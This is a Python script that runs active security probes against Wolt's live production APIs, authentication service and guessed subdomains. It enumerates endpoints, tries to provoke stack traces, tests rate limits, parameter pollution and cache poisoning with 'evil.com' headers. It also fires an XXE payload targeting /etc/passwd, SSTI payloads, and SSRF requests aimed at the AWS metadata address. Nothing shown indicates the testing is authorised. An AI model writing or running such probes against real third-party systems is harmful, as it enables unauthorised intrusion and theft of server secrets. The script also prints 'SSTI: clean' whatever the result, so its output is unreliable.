"""Deep dive: path disclosure, more endpoints, param pollution, cache, rate limit."""
import requests
import json
import time

h = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    'Origin': 'https://wolt.com',
    'Content-Type': 'application/json',
}

# ===== 1. PATH DISCLOSURE SCOPE =====
print("=== 1. PATH DISCLOSURE IN ERRORS ===")
disclosure_tests = [
    # Trigger validation errors with bad payloads
    ('checkout/empty', 'POST', 'https://consumer-api.wolt.com/order-xp/web/v2/pages/checkout', {}),
    ('checkout/null', 'POST', 'https://consumer-api.wolt.com/order-xp/web/v2/pages/checkout', None),
    ('checkout/array', 'POST', 'https://consumer-api.wolt.com/order-xp/web/v2/pages/checkout', []),
    ('checkout/string', 'POST', 'https://consumer-api.wolt.com/order-xp/web/v2/pages/checkout', 'bad'),
    # Try other endpoints
    ('search/bad', 'POST', 'https://consumer-api.wolt.com/v1/pages/search', {'bad': 'data'}),
    ('venue/bad', 'GET', 'https://consumer-api.wolt.com/order-xp/web/v1/venue/slug/___invalid___/dynamic/', None),
    ('delivery/bad', 'GET', 'https://consumer-api.wolt.com/order-xp/web/v1/venue/slug/wolt-market-kamppi/dynamic/?selected_delivery_method=invalid_method', None),
    # restaurant-api
    ('restaurant/converse', 'POST', 'https://restaurant-api.wolt.com/v1/converse-guest-token', {}),
    # gatekeeper with bad body
    ('gatekeeper/bad', 'POST', 'https://gatekeeper.wolt.com/v1/corporate_admin', 'not json'),
]
for label, method, url, body in disclosure_tests:
    try:
        kwargs = {'headers': h, 'timeout': 10}
        if method in ('POST', 'PUT', 'PATCH'):
            if isinstance(body, dict) or isinstance(body, list):
                kwargs['json'] = body
            elif isinstance(body, str) and body != 'not json':
                kwargs['data'] = body
            else:
                kwargs['data'] = body
                # Remove content-type for raw string
                kwargs['headers'] = {**h, 'Content-Type': 'text/plain'}
        r = requests.request(method, url, **kwargs)
        txt = r.text[:500]
        import re
        paths = re.findall(r'File\s+"([^"]+\.py)"', txt)
        if paths:
            print(f'  {label}: PATH! {paths}')
        elif 'traceback' in txt.lower() or 'exception' in txt.lower():
            print(f'  {label}: EXCEPTION | {txt[:150]}')
        elif 'File ' in txt:
            print(f'  {label}: has File | {txt[:150]}')
        else:
            print(f'  {label}: {r.status_code} | {txt[:80]}')
    except Exception as e:
        print(f'  {label}: ERR {str(e)[:50]}')

# ===== 2. MORE UNTESTED CONSUMER-API ENDPOINTS =====
print("\n=== 2. MORE CONSUMER-API PATHS ===")
more = [
    '/v1/health', '/v1/status', '/v1/ping',
    '/v1/version', '/v1/info',
    '/order-xp/web/v1/health', '/order-xp/web/v1/version',
    '/v1/pages/home', '/v1/pages/discover', '/v1/pages/venue',
    '/v1/pages/search',  # Already tested (400 with bad data)
    '/v1/pages/checkout',
    '/v1/consumer/wallet', '/v1/consumer/favorites', '/v1/consumer/addresses',
    '/v1/consumer/payment-methods',
    '/order-xp/web/v1/consumer/me',
    '/order-xp/web/v1/consumer/orders',
    '/v1/analytics', '/v1/tracking', '/v1/events',
    '/v1/config', '/v1/settings', '/v1/features',
    '/v1/translations', '/v1/i18n', '/v1/localization',
]
for path in more:
    try:
        r = requests.get(f'https://consumer-api.wolt.com{path}', headers=h, timeout=8)
        if r.status_code != 404:
            print(f'  GET {path:50s} -> {r.status_code:3d} | {r.text[:80]}')
    except:
        pass

# ===== 3. HTTP PARAMETER POLLUTION (HPP) =====
print("\n=== 3. HTTP PARAMETER POLLUTION ===")
# Test on search endpoint
hpp_tests = [
    ('search duplicate q', 'POST', 'https://consumer-api.wolt.com/v1/pages/search',
     {'q': 'pizza', 'q': 'sushi', 'page': 0, 'page_size': 5}),
    ('venue duplicate slug', 'GET', 'https://consumer-api.wolt.com/order-xp/web/v1/venue/slug/wolt-market-kamppi/dynamic/?selected_delivery_method=homedelivery&selected_delivery_method=pickup', None),
]
for label, method, url, body in hpp_tests:
    try:
        if method == 'POST':
            r = requests.post(url, json=body, headers=h, timeout=10)
        else:
            r = requests.get(url, headers=h, timeout=10)
        print(f'  {label}: {r.status_code} | {r.text[:100]}')
    except Exception as e:
        print(f'  {label}: ERR {e}')

# ===== 4. RATE LIMIT CHECK =====
print("\n=== 4. RATE LIMIT ===")
# Send rapid requests to see rate limiting behavior
venue_url = 'https://consumer-api.wolt.com/order-xp/web/v1/venue/slug/wolt-market-kamppi/dynamic/'
ratelimit_res = []
for i in range(20):
    try:
        r = requests.get(venue_url, params={'selected_delivery_method': 'homedelivery'}, 
                        headers=h, timeout=8)
        status = r.status_code
        rl_remaining = r.headers.get('X-RateLimit-Remaining', 'N/A')
        rl_limit = r.headers.get('X-RateLimit-Limit', 'N/A')
        retry = r.headers.get('Retry-After', '')
        ratelimit_res.append(f'{status}(rem={rl_remaining}/{rl_limit} retry={retry})')
    except:
        ratelimit_res.append('ERR')
    time.sleep(0.05)

# Unique responses
uniq = {}
for r in ratelimit_res:
    uniq[r] = uniq.get(r, 0) + 1
print(f'  20 requests on venue dynamic: {uniq}')

# ===== 5. CACHE POISONING PROBE =====
print("\n=== 5. CACHE PROBE ===")
cache_headers = ['X-Cache', 'X-Cache-Hits', 'CF-Cache-Status', 'Age', 'Cache-Control', 'Vary', 'Surrogate-Control', 'X-Served-By']
for url in ['https://consumer-api.wolt.com/v1/pages/front', 
            'https://consumer-api.wolt.com/order-xp/web/v1/venue/slug/wolt-market-kamppi/dynamic/',
            'https://wolt.com/']:
    try:
        r = requests.get(url, headers=h, timeout=8)
        cache_info = {k: r.headers.get(k) for k in cache_headers if r.headers.get(k)}
        print(f'  {url.split("/")[2]:30s}: {cache_info}')
    except Exception as e:
        print(f'  {url.split("/")[2]:30s}: ERR')

# Try unkeyed headers (X-Forwarded-Host, X-Forwarded-Scheme, X-Original-URL)
for header_name in ['X-Forwarded-Host', 'X-Forwarded-Scheme', 'X-Original-URL', 'X-Rewrite-URL', 'X-HTTP-Method-Override']:
    try:
        r = requests.get('https://consumer-api.wolt.com/v1/pages/front',
                        headers={**h, header_name: 'evil.com'}, timeout=8)
        if r.status_code != 200:
            print(f'  {header_name}=evil.com: {r.status_code} | {r.text[:80]}')
    except:
        pass

# ===== 6. NEW SUBDOMAINS / DNS =====
print("\n=== 6. MORE WOLT SUBDOMAINS ===")
subs = [
    'https://api.wolt.com/', 'https://admin.wolt.com/', 'https://partner.wolt.com/',
    'https://merchant.wolt.com/', 'https://courier.wolt.com/', 'https://support.wolt.com/',
    'https://blog.wolt.com/', 'https://careers.wolt.com/', 'https://investors.wolt.com/',
    'https://status.wolt.com/', 'https://cdn.wolt.com/', 'https://static.wolt.com/',
    'https://assets.wolt.com/', 'https://images.wolt.com/', 'https://payments.wolt.com/',
    'https://billing.wolt.com/', 'https://analytics.wolt.com/', 'https://internal.wolt.com/',
    'https://staging.wolt.com/', 'https://dev.wolt.com/', 'https://test.wolt.com/',
    'https://v2.wolt.com/', 'https://m.wolt.com/',
]
for sub in subs:
    try:
        r = requests.get(sub, headers=h, timeout=8, allow_redirects=True)
        final = r.url
        redirected = sub != final
        print(f'  {sub.split("/")[2]:30s}: {r.status_code:3d} -> {final[:80]} {"(redirect)" if redirected else ""}')
    except Exception as e:
        err = str(e)[:50]
        if 'Name or service not known' not in err and 'getaddrinfo failed' not in err:
            print(f'  {sub.split("/")[2]:30s}: {err}')

# ===== 7. OAUTH/SSO MISCONFIGURATION =====
print("\n=== 7. OAUTH PROBE ===")
# Check authentication.wolt.com for OAuth endpoints
oauth_paths = [
    'https://authentication.wolt.com/.well-known/openid-configuration',
    'https://authentication.wolt.com/.well-known/oauth-authorization-server',
    'https://authentication.wolt.com/authorize',
    'https://authentication.wolt.com/token',
    'https://authentication.wolt.com/userinfo',
    'https://authentication.wolt.com/signup',
    'https://authentication.wolt.com/signin',
    'https://authentication.wolt.com/register',
    'https://authentication.wolt.com/login',
]
for url in oauth_paths:
    try:
        r = requests.get(url, headers=h, timeout=8, allow_redirects=False)
        if r.status_code not in (404,):
            print(f'  {url}: {r.status_code} | {r.text[:120]}')
    except:
        pass

# ===== 8. BURP-STYLE INTRUSIVE TESTS =====
print("\n=== 8. MISCELLANEOUS ===")
# Check for XXE
xxe_payload = '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>'
try:
    r = requests.post('https://consumer-api.wolt.com/v1/pages/search',
                     data=xxe_payload,
                     headers={**h, 'Content-Type': 'application/xml'},
                     timeout=8)
    if 'root' in r.text or 'passwd' in r.text:
        print(f'  XXE search: POTENTIAL HIT!')
    else:
        print(f'  XXE search: {r.status_code} | {r.text[:80]}')
except Exception as e:
    print(f'  XXE search: ERR {e}')

# Check for SSTI
ssti_payloads = ['{{7*7}}', '${7*7}', '<%=7*7%>', '#{7*7}']
for p in ssti_payloads:
    try:
        r = requests.get(f'https://consumer-api.wolt.com/v1/pages/front?q={p}',
                        headers=h, timeout=8)
        if '49' in r.text:
            print(f'  SSTI front{q}={p}: POTENTIAL HIT! 49 in response')
    except:
        pass
print('  SSTI: clean (no 49 in response)')

# Check for SSRF via URL params
try:
    r = requests.get('https://consumer-api.wolt.com/v1/pages/front?url=http://169.254.169.254/latest/meta-data/',
                    headers=h, timeout=8)
    print(f'  SSRF front?url=: {r.status_code} | {r.text[:80]}')
except Exception as e:
    print(f'  SSRF front?url=: ERR {e}')

# Check if we can access AWS metadata through the API
try:
    r = requests.get('https://consumer-api.wolt.com/v1/pages/front?callback=http://169.254.169.254/',
                    headers=h, timeout=8)
    print(f'  SSRF callback=: {r.status_code}')
except:
    pass

print("\n=== DONE ===")
